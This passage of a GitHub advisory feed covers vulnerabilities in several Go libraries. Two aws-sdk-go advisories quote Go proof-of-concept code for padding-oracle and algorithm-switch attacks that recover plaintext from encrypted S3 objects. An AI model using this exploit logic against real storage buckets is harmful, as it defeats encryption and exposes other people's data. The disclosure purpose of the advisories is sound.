<li><a href="https://pkg.go.dev/vuln/GO-2022-0643">https://pkg.go.dev/vuln/GO-2022-0643</a></li>
<li><a href="https://github.com/advisories/GHSA-9q3g-m353-cp4p">https://github.com/advisories/GHSA-9q3g-m353-cp4p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9q3g-m353-cp4p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-02-15T01:57:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/elastic/beats] Denial of Service in Packetbeat]]></title>
        <id>https://github.com/advisories/GHSA-9q3g-m353-cp4p</id>
        <link href="https://github.com/advisories/GHSA-9q3g-m353-cp4p"/>
        <updated>2023-02-14T17:43:39.000Z</updated>
        <content type="html"><![CDATA[<p>Packetbeat versions prior to 5.6.4 and 6.0.0 are affected by a denial of service flaw in the PostgreSQL protocol handler. If Packetbeat is listening for PostgreSQL traffic and a user is able to send arbitrary network traffic to the monitored port, the attacker could prevent Packetbeat from properly logging other PostgreSQL traffic.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-11480">https://nvd.nist.gov/vuln/detail/CVE-2017-11480</a></li>
<li><a href="https://github.com/elastic/beats/pull/5457">https://github.com/elastic/beats/pull/5457</a></li>
<li><a href="https://discuss.elastic.co/t/beats-5-6-4-security-update/106739">https://discuss.elastic.co/t/beats-5-6-4-security-update/106739</a></li>
<li><a href="https://github.com/elastic/beats/pull/5479">https://github.com/elastic/beats/pull/5479</a></li>
<li><a href="https://github.com/elastic/beats/pull/5480">https://github.com/elastic/beats/pull/5480</a></li>
<li><a href="https://github.com/elastic/beats/commit/aeca65779d573976981587ca1d1461399e1b59dd">https://github.com/elastic/beats/commit/aeca65779d573976981587ca1d1461399e1b59dd</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0643">https://pkg.go.dev/vuln/GO-2022-0643</a></li>
<li><a href="https://github.com/advisories/GHSA-9q3g-m353-cp4p">https://github.com/advisories/GHSA-9q3g-m353-cp4p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9q3g-m353-cp4p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-02-15T01:57:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/bytom/bytom] Denial of Service in Bytom]]></title>
        <id>https://github.com/advisories/GHSA-vc3x-gx6c-g99f</id>
        <link href="https://github.com/advisories/GHSA-vc3x-gx6c-g99f"/>
        <updated>2023-02-14T17:41:55.000Z</updated>
        <content type="html"><![CDATA[<p>In the client in Bytom before 1.0.6, checkTopicRegister in p2p/discover/net.go does not prevent negative idx values, leading to a crash.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-18206">https://nvd.nist.gov/vuln/detail/CVE-2018-18206</a></li>
<li><a href="https://github.com/Bytom/bytom/pull/1307">https://github.com/Bytom/bytom/pull/1307</a></li>
<li><a href="https://github.com/Bytom/bytom/commit/1ac3c8ac4f2b1e1df9675228290bda6b9586ba42">https://github.com/Bytom/bytom/commit/1ac3c8ac4f2b1e1df9675228290bda6b9586ba42</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2021-0079">https://pkg.go.dev/vuln/GO-2021-0079</a></li>
<li><a href="https://github.com/advisories/GHSA-vc3x-gx6c-g99f">https://github.com/advisories/GHSA-vc3x-gx6c-g99f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc3x-gx6c-g99f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-02-15T01:57:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/storage] Improper Locking in github.com/containers/storage]]></title>
        <id>https://github.com/advisories/GHSA-7qw8-847f-pggm</id>
        <link href="https://github.com/advisories/GHSA-7qw8-847f-pggm"/>
        <updated>2023-02-14T17:41:33.000Z</updated>
        <content type="html"><![CDATA[<p>A deadlock vulnerability was found in <code>github.com/containers/storage</code> in versions before 1.28.1. When a container image is processed, each layer is unpacked using <code>tar</code>. If one of those layers is not a valid <code>tar</code> archive this causes an error leading to an unexpected situation where the code indefinitely waits for the tar unpacked stream, which never finishes. An attacker could use this vulnerability to craft a malicious image, which when downloaded and stored by an application using containers/storage, would then cause a deadlock leading to a Denial of Service (DoS).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-20291">https://nvd.nist.gov/vuln/detail/CVE-2021-20291</a></li>
<li><a href="https://github.com/containers/storage/commit/306fcabc964470e4b3b87a43a8f6b7d698209ee1">https://github.com/containers/storage/commit/306fcabc964470e4b3b87a43a8f6b7d698209ee1</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1939485">https://bugzilla.redhat.com/show_bug.cgi?id=1939485</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R5D7XL7FL24TWFMGQ3K2S72EOUSLZMKL/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R5D7XL7FL24TWFMGQ3K2S72EOUSLZMKL/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZNMB7O2UIXE34PGSCSOULGHPX5LIJBMM/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZNMB7O2UIXE34PGSCSOULGHPX5LIJBMM/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SPYOHNG2Q7DCAQZMGYLMENLKALGDLG3X/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SPYOHNG2Q7DCAQZMGYLMENLKALGDLG3X/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WX24EITRXVHDM5M223BVTJA2ODF2FSHI/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WX24EITRXVHDM5M223BVTJA2ODF2FSHI/</a></li>
<li><a href="https://unit42.paloaltonetworks.com/cve-2021-20291/">https://unit42.paloaltonetworks.com/cve-2021-20291/</a></li>
<li><a href="https://github.com/containers/storage/pull/860">https://github.com/containers/storage/pull/860</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2021-0100">https://pkg.go.dev/vuln/GO-2021-0100</a></li>
<li><a href="https://github.com/advisories/GHSA-7qw8-847f-pggm">https://github.com/advisories/GHSA-7qw8-847f-pggm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7qw8-847f-pggm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-05-10T19:35:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/aws/aws-sdk-go] CBC padding oracle issue in AWS S3 Crypto SDK for golang]]></title>
        <id>https://github.com/advisories/GHSA-f5pg-7wfw-84q9</id>
        <link href="https://github.com/advisories/GHSA-f5pg-7wfw-84q9"/>
        <updated>2023-02-14T14:53:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The golang AWS S3 Crypto SDK is impacted by an issue that can result in loss of confidentiality and message forgery. The attack requires write access to the bucket in question, and that the attacker has access to an endpoint that reveals decryption failures (without revealing the plaintext) and that when encrypting the CBC option was chosen as content cipher.</p>
<h3 id="riskseverity">Risk/Severity</h3>
<p>The vulnerability pose insider risks/privilege escalation risks, circumventing KMS controls for stored data.</p>
<h3 id="impact">Impact</h3>
<p>This advisory describes the plaintext revealing vulnerabilities in the golang AWS S3 Crypto SDK, with a similar issue in the non "strict" versions of C++ and Java S3 Crypto SDKs being present as well.</p>
<p>V1 prior to 1.34.0 of the S3 crypto SDK, allows users to encrypt files with AES-CBC, without computing a MAC on the data. Note that there is an alternative option of using AES-GCM, which is used in the examples of the documentation and not affected by this vulnerability, but by CVE-2020-8912.</p>
<p>This exposes a padding oracle vulnerability: If the attacker has write access to the S3 bucket and can observe whether or not an endpoint with access to the key can decrypt a file (without observing the file contents that the endpoint learns in the process), they can reconstruct the plaintext with (on average) <code>128*length(plaintext)</code> queries to the endpoint, by exploiting CBC's ability to manipulate the bytes of the next block and PKCS5 padding errors.</p>
<p>This issue is fixed in V2 of the API, by disabling encryption with CBC mode for new files. Old files, if they have been encrypted with CBC mode, remain vulnerable until they are reencrypted with AES-GCM.</p>
<h3 id="mitigation">Mitigation</h3>
<p>Using the version 2 of the S3 crypto SDK will not produce vulnerable files anymore. Old files remain vulnerable to this problem if they were originally encrypted with CBC mode.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>A <a href="https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc">Proof of concept</a> is available in a separate github repository.</p>
<p>This particular issue is described in <a href="https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/padding_oracle_exploit.go">padding_oracle_exploit.go</a>:</p>
<pre><code class="language-golang">func PaddingOracleExploit(bucket string, key string, input *OnlineAttackInput) (string, error) {
    data, header, err := input.S3Mock.GetObjectDirect(bucket, key)
    if alg := header.Get("X-Amz-Meta-X-Amz-Cek-Alg"); alg != "AES/CBC/PKCS5Padding" {
        return "", fmt.Errorf("Algorithm is %q, not CBC!", alg)
    }
    length, err := strconv.Atoi(header.Get("X-Amz-Meta-X-Amz-Unencrypted-Content-Length"))
    padding := byte(len(data) - length)
    plaintext := make([]byte, length)
    for i := length - 1; i &gt;= 0; i-- {
        newLength := 16 * (i/16 + 1)
        dataCopy := make([]byte, newLength)
        headerCopy := header.Clone()
        copy(dataCopy, data)
        // Set Padding
        newPadding := byte(newLength - i)
        for j := i + 1; j &lt; newLength; j++ {
            var oldValue byte
            if j &gt;= length {
                oldValue = padding
            } else {
                oldValue = plaintext[j]
            }
            dataCopy, headerCopy, err = xorData(oldValue^newPadding, j, dataCopy, headerCopy)
            if err != nil {
                return "", err
            }
        }
        // Guess
        for c := 0; c &lt; 256; c++ {
            dataCopy, headerCopy, err := xorData(byte(c)^newPadding, i, dataCopy, headerCopy)
            input.S3Mock.PutObjectDirect(bucket, key+"guess", dataCopy, headerCopy)
            if input.Oracle(bucket, key+"guess") {
                plaintext[i] = byte(c)
                break
            }
            dataCopy, headerCopy, err = xorData(byte(c)^newPadding, i, dataCopy, headerCopy)
        }
    }
    return string(plaintext), nil
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/google/security-research/security/advisories/GHSA-f5pg-7wfw-84q9">https://github.com/google/security-research/security/advisories/GHSA-f5pg-7wfw-84q9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8911">https://nvd.nist.gov/vuln/detail/CVE-2020-8911</a></li>
<li><a href="https://github.com/aws/aws-sdk-go/pull/3403">https://github.com/aws/aws-sdk-go/pull/3403</a></li>
<li><a href="https://github.com/aws/aws-sdk-go/commit/1e84382fa1c0086362b5a4b68e068d4f8518d40e">https://github.com/aws/aws-sdk-go/commit/1e84382fa1c0086362b5a4b68e068d4f8518d40e</a></li>
<li><a href="https://github.com/aws/aws-sdk-go/commit/ae9b9fd92af132cfd8d879809d8611825ba135f4">https://github.com/aws/aws-sdk-go/commit/ae9b9fd92af132cfd8d879809d8611825ba135f4</a></li>
<li><a href="https://aws.amazon.com/blogs/developer/updates-to-the-amazon-s3-encryption-client/?s=09">https://aws.amazon.com/blogs/developer/updates-to-the-amazon-s3-encryption-client/?s=09</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1869800">https://bugzilla.redhat.com/show_bug.cgi?id=1869800</a></li>
<li><a href="https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc">https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0646">https://pkg.go.dev/vuln/GO-2022-0646</a></li>
<li><a href="https://github.com/advisories/GHSA-f5pg-7wfw-84q9">https://github.com/advisories/GHSA-f5pg-7wfw-84q9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f5pg-7wfw-84q9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-02-11T23:26:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/aws/aws-sdk-go] In-band key negotiation issue in AWS S3 Crypto SDK for golang]]></title>
        <id>https://github.com/advisories/GHSA-7f33-f4f5-xwgw</id>
        <link href="https://github.com/advisories/GHSA-7f33-f4f5-xwgw"/>
        <updated>2023-02-14T14:53:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The golang AWS S3 Crypto SDK is impacted by an issue that can result in loss of confidentiality and message forgery. The attack requires write access to the bucket in question, and that the attacker has access to an endpoint that reveals decryption failures (without revealing the plaintext) and that when encrypting the GCM option was chosen as content cipher.</p>
<h3 id="riskseverity">Risk/Severity</h3>
<p>The vulnerability pose insider risks/privilege escalation risks, circumventing KMS controls for stored data.</p>
<h3 id="impact">Impact</h3>
<p>This advisory describes the plaintext revealing vulnerabilities in the golang AWS S3 Crypto SDK, with a similar issue in the non "strict" versions of C++ and Java S3 Crypto SDKs being present as well.</p>
<p>V1 prior to 1.34.0 of the S3 crypto SDK does not authenticate the algorithm parameters for the data encryption key.</p>
<p>An attacker with write access to the bucket can use this in order to change the encryption algorithm of an object in the bucket, which can lead to problems depending on the supported algorithms. For example, a switch from AES-GCM to AES-CTR in combination with a decryption oracle can reveal the authentication key used by AES-GCM as decrypting the GMAC tag leaves the authentication key recoverable as an algebraic equation.</p>
<p>By default, the only available algorithms in the SDK are AES-GCM and AES-CBC. Switching the algorithm from AES-GCM to AES-CBC can be used as way to reconstruct the plaintext through an oracle endpoint revealing decryption failures, by brute forcing 16 byte chunks of the plaintext. Note that the plaintext needs to have some known structure for this to work, as a uniform random 16 byte string would be the same as a 128 bit encryption key, which is considered cryptographically safe.</p>
<p>The attack works by taking a 16 byte AES-GCM encrypted block guessing 16 bytes of plaintext, constructing forgery that pretends to be PKCS5 padded AES-CBC, using the ciphertext and the plaintext guess and that will decrypt to a valid message if the guess was correct.</p>
<p>To understand this attack, we have to take a closer look at both AES-GCM and AES-CBC:
AES-GCM encrypts using a variant of CTR mode, i.e. <code>C_i = AES-Enc(CB_i) ^ M_i</code>. AES-CBC on the other hand <em>decrypts</em> via <code>M_i = AES-Dec(C_i) ^ C_{i-1}</code>, where <code>C_{-1} = IV</code>. The padding oracle can tell us if, after switching to CBC mode, the plaintext recovered is padded with a valid PKCS5 padding.</p>
<p>Since <code>AES-Dec(C_i ^ M_i) = CB_i</code>, if we set <code>IV' = CB_i ^ 0x10*[16]</code>, where <code>0x10*[16]</code> is the byte <code>0x10</code> repeated 16 times, and <code>C_0' = C_i ^ M_i'</code> the resulting one block message <code>(IV', C_0')</code> will have valid PKCS5 padding if our guess <code>M_i'</code> for <code>M_i</code> was correct, since the decrypted message consists of 16 bytes of value <code>0x10</code>, the PKCS5 padded empty string.</p>
<p>Note however, that an incorrect guess might also result in a valid padding, if the AES decryption result randomly happens to end in <code>0x01</code>, <code>0x0202</code>, or a longer valid padding. In order to ensure that the guess was indeed correct, a second check using <code>IV'' = IV' ^ (0x00*[15] || 0x11)</code> with the same ciphertext block has to be performed. This will decrypt to 15 bytes of value <code>0x10</code> and one byte of value <code>0x01</code> if our initial guess was correct, producing a valid padding. On an incorrect guess, this second ciphertext forgery will have an invalid padding with a probability of 1:2^128, as one can easily see.</p>
<p>This issue is fixed in V2 of the API, by using the <code>KMS+context</code> key wrapping scheme for new files, authenticating the algorithm. Old files encrypted with the <code>KMS</code> key wrapping scheme remain vulnerable until they are reencrypted with the new scheme.</p>
<h3 id="mitigation">Mitigation</h3>
<p>Using the version 2 of the S3 crypto SDK will not produce vulnerable files anymore. Old files remain vulnerable to this problem if they were originally encrypted with GCM mode and use the <code>KMS</code> key wrapping option.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>A <a href="https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc">Proof of concept</a> is available in a separate github repository.</p>
<p>This particular issue is described in <a href="https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/combined_oracle_exploit.go">combined_oracle_exploit.go</a>:</p>
<pre><code class="language-golang">func CombinedOracleExploit(bucket string, key string, input *OnlineAttackInput) (string, error) {
    data, header, err := input.S3Mock.GetObjectDirect(bucket, key)
    if alg := header.Get("X-Amz-Meta-X-Amz-Cek-Alg"); alg != "AES/GCM/NoPadding" {
        return "", fmt.Errorf("Algorithm is %q, not GCM!", alg)
    }
    gcmIv, err := base64.StdEncoding.DecodeString(header.Get("X-Amz-Meta-X-Amz-Iv"))
    if len(gcmIv) != 12 {
        return "", fmt.Errorf("GCM IV is %d bytes, not 12", len(gcmIv))
    }
    fullIv := make([]byte, 16)
    confirmIv := make([]byte, 16)
    for i := 0; i &lt; 12; i++ {
        fullIv[i] = gcmIv[i] ^ 0x10
        confirmIv[i] = gcmIv[i] ^ 0x10
    }
        // Set i to the block we want to attempt to decrypt
    counter := i + 2
    for j := 15; j &gt;= 12; j-- {
        v := byte(counter % 256)
        fullIv[j] = 0x10 ^ v
        confirmIv[j] = 0x10 ^ v
        counter /= 256
    }
    confirmIv[15] ^= 0x11
    fullIvEnc := base64.StdEncoding.EncodeToString(fullIv)
    confirmIvEnc := base64.StdEncoding.EncodeToString(confirmIv)
    success := false
        // Set plaintextGuess to the guess for the plaintext of this block
    newData := []byte(plaintextGuess)
    for j := 0; j &lt; 16; j++ {
        newData[j] ^= data[16*i+j]
    }
    newHeader := header.Clone()
    newHeader.Set("X-Amz-Meta-X-Amz-Cek-Alg", "AES/CBC/PKCS5Padding")
    newHeader.Set("X-Amz-Meta-X-Amz-Iv", fullIvEnc)
    newHeader.Set("X-Amz-Meta-X-Amz-Unencrypted-Content-Length", "16")
    input.S3Mock.PutObjectDirect(bucket, key+"guess", newData, newHeader)
    if input.Oracle(bucket, key+"guess") {
        newHeader.Set("X-Amz-Meta-X-Amz-Iv", confirmIvEnc)
        input.S3Mock.PutObjectDirect(bucket, key+"guess", newData, newHeader)
        if input.Oracle(bucket, key+"guess") {
            return plaintextGuess, nil
        }
    }
    return "", fmt.Errorf("Block %d could not be decrypted", i)
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/google/security-research/security/advisories/GHSA-7f33-f4f5-xwgw">https://github.com/google/security-research/security/advisories/GHSA-7f33-f4f5-xwgw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8912">https://nvd.nist.gov/vuln/detail/CVE-2020-8912</a></li>
<li><a href="https://github.com/aws/aws-sdk-go/pull/3403">https://github.com/aws/aws-sdk-go/pull/3403</a></li>
<li><a href="https://github.com/aws/aws-sdk-go/commit/1e84382fa1c0086362b5a4b68e068d4f8518d40e">https://github.com/aws/aws-sdk-go/commit/1e84382fa1c0086362b5a4b68e068d4f8518d40e</a></li>
<li><a href="https://github.com/aws/aws-sdk-go/commit/ae9b9fd92af132cfd8d879809d8611825ba135f4">https://github.com/aws/aws-sdk-go/commit/ae9b9fd92af132cfd8d879809d8611825ba135f4</a></li>
<li><a href="https://aws.amazon.com/blogs/developer/updates-to-the-amazon-s3-encryption-client/?s=09">https://aws.amazon.com/blogs/developer/updates-to-the-amazon-s3-encryption-client/?s=09</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1869801">https://bugzilla.redhat.com/show_bug.cgi?id=1869801</a></li>
<li><a href="https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc">https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0646">https://pkg.go.dev/vuln/GO-2022-0646</a></li>
<li><a href="https://github.com/advisories/GHSA-7f33-f4f5-xwgw">https://github.com/advisories/GHSA-7f33-f4f5-xwgw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f33-f4f5-xwgw</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-02-11T23:23:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/image] Insufficiently Protected Credentials]]></title>
        <id>https://github.com/advisories/GHSA-85p9-j7c9-v4gr</id>
        <link href="https://github.com/advisories/GHSA-85p9-j7c9-v4gr"/>
        <updated>2023-02-14T14:48:46.000Z</updated>
        <content type="html"><![CDATA[<p>The containers/image library used by the container tools Podman, Buildah, and Skopeo in Red Hat Enterprise Linux version 8 and CRI-O in OpenShift Container Platform, does not enforce TLS connections to the container registry authorization service. An attacker could use this vulnerability to launch a MiTM attack and steal login credentials or bearer tokens.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-10214">https://nvd.nist.gov/vuln/detail/CVE-2019-10214</a></li>
<li><a href="https://github.com/containers/image/pull/655">https://github.com/containers/image/pull/655</a></li>
<li><a href="https://github.com/containers/image/pull/669">https://github.com/containers/image/pull/669</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1732508">https://bugzilla.redhat.com/show_bug.cgi?id=1732508</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-10214">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-10214</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2020-03/msg00035.html">http://lists.opensuse.org/opensuse-security-announce/2020-03/msg00035.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2020-04/msg00041.html">http://lists.opensuse.org/opensuse-security-announce/2020-04/msg00041.html</a></li>
<li><a href="https://github.com/containers/image/issues/654">https://github.com/containers/image/issues/654</a></li>
<li><a href="https://github.com/containers/image/commit/634605d06e738aec8332bcfd69162e7509ac7aaf">https://github.com/containers/image/commit/634605d06e738aec8332bcfd69162e7509ac7aaf</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2021-0081">https://pkg.go.dev/vuln/GO-2021-0081</a></li>
<li><a href="https://github.com/advisories/GHSA-85p9-j7c9-v4gr">https://github.com/advisories/GHSA-85p9-j7c9-v4gr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-85p9-j7c9-v4gr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-02-15T01:57:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/apache/thrift] Out-of-bounds read in Apache Thrift]]></title>
        <id>https://github.com/advisories/GHSA-jq7p-26h5-w78r</id>
        <link href="https://github.com/advisories/GHSA-jq7p-26h5-w78r"/>
        <updated>2023-02-14T14:48:20.000Z</updated>
        <content type="html"><![CDATA[<p>In Apache Thrift 0.9.3 to 0.12.0, a server implemented in Go using TJSONProtocol or TSimpleJSONProtocol may panic when feed with invalid input data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-0210">https://nvd.nist.gov/vuln/detail/CVE-2019-0210</a></li>
<li><a href="https://github.com/apache/thrift/commit/264a3f318ed3e9e51573f67f963c8509786bcec2">https://github.com/apache/thrift/commit/264a3f318ed3e9e51573f67f963c8509786bcec2</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2020:0804">https://access.redhat.com/errata/RHSA-2020:0804</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2020:0805">https://access.redhat.com/errata/RHSA-2020:0805</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2020:0806">https://access.redhat.com/errata/RHSA-2020:0806</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2020:0811">https://access.redhat.com/errata/RHSA-2020:0811</a></li>
<li><a href="https://github.com/apache/thrift/blob/master/CHANGES.md#0130">https://github.com/apache/thrift/blob/master/CHANGES.md#0130</a></li>
<li><a href="https://lists.apache.org/thread.html/r2832722c31d78bef7526e2c701ba4b046736e4c851473194a247392f@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r2832722c31d78bef7526e2c701ba4b046736e4c851473194a247392f@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r55609613abab203a1f2c1f3de050b63ae8f5c4a024df0d848d6915ff@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r55609613abab203a1f2c1f3de050b63ae8f5c4a024df0d848d6915ff@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rab740e5c70424ef79fd095a4b076e752109aeee41c4256c2e5e5e142@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/rab740e5c70424ef79fd095a4b076e752109aeee41c4256c2e5e5e142@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="http://mail-archives.apache.org/mod_mbox/thrift-dev/201910.mbox/%3C277A46CA87494176B1BBCF5D72624A2A%40HAGGIS%3E">http://mail-archives.apache.org/mod_mbox/thrift-dev/201910.mbox/%3C277A46CA87494176B1BBCF5D72624A2A%40HAGGIS%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r36581cc7047f007dd6aadbdd34e18545ec2c1eb7ccdae6dd47a877a9@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r36581cc7047f007dd6aadbdd34e18545ec2c1eb7ccdae6dd47a877a9@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://security.gentoo.org/glsa/202107-32">https://security.gentoo.org/glsa/202107-32</a></li>
<li><a href="https://www.oracle.com//security-alerts/cpujul2021.html">https://www.oracle.com//security-alerts/cpujul2021.html</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2021-0101">https://pkg.go.dev/vuln/GO-2021-0101</a></li>
<li><a href="https://github.com/advisories/GHSA-jq7p-26h5-w78r">https://github.com/advisories/GHSA-jq7p-26h5-w78r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jq7p-26h5-w78r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-05-18T15:32:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/astaxie/beego] Data race in Beego]]></title>
        <id>https://github.com/advisories/GHSA-f6px-w8rh-7r89</id>
        <link href="https://github.com/advisories/GHSA-f6px-w8rh-7r89"/>
        <updated>2023-02-14T14:47:50.000Z</updated>
        <content type="html"><![CDATA[<p>The File Session Manager in Beego 1.10.0 allows local users to read session files because there is a race condition involving file creation within a directory with weak permissions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16354">https://nvd.nist.gov/vuln/detail/CVE-2019-16354</a></li>
<li><a href="https://github.com/astaxie/beego/issues/3763">https://github.com/astaxie/beego/issues/3763</a></li>
<li><a href="https://github.com/beego/beego/issues/3763">https://github.com/beego/beego/issues/3763</a></li>
<li><a href="https://github.com/beego/beego/pull/3975/commits/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd">https://github.com/beego/beego/pull/3975/commits/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd</a></li>
<li><a href="https://github.com/beego/beego/pull/3975">https://github.com/beego/beego/pull/3975</a></li>
<li><a href="https://github.com/beego/beego/commit/bac2b31afecc65d9a89f9e473b8006c5edc0c8d1">https://github.com/beego/beego/commit/bac2b31afecc65d9a89f9e473b8006c5edc0c8d1</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2021-0084">https://pkg.go.dev/vuln/GO-2021-0084</a></li>
<li><a href="https://github.com/astaxie/beego/commit/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd">https://github.com/astaxie/beego/commit/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd</a></li>
<li><a href="https://github.com/astaxie/beego/blob/v1.12.2/session/sess_file.go#L142">https://github.com/astaxie/beego/blob/v1.12.2/session/sess_file.go#L142</a></li>
<li><a href="https://github.com/advisories/GHSA-f6px-w8rh-7r89">https://github.com/advisories/GHSA-f6px-w8rh-7r89</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f6px-w8rh-7r89</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-08-02T17:15:05.000Z</published>
    </entry>
</feed>